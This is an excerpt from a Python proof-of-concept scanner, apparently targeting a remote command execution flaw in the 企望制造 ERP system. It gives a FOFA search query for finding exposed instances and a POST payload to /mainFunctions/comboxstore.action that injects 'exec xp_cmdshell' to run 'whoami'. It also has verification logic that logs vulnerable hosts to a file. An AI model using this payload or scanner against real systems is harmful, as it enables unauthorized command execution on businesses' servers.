...
def title():
    print("""
    Author: Lem
    Condition:fofa-qeury: title="企望制造ERP系统"
    Name:企望制造erp系统远程命令执行漏洞
    Vulnerability details: 
    Solutions:
    POC: POST /mainFunctions/comboxstore.action  data:comboxsql=exec%20xp_cmdshell%20'whoami'
    EXP: 
    """)
...
def poc():  #自定义poc内容
    ...
    poc_url_path = "/mainFunctions/comboxstore.action"   
...
def process_verification(scan_url, re_data, verification, re_data_keyword,regex_match, file_handle):  
    if verification == 'status_code':  
        ...
        #print(find_list)  
        if find_list:
            print(f'Successfully_queried:{find_list[0]}')  
            file_handle.write(f"{scan_url}-'command_whoami'-{find_list[0]}\n")  
        ...
        if re_data_keyword in find_data:
            print(f'Successfully_queried:"command_whoami" {find_data[re_data_keyword]}')
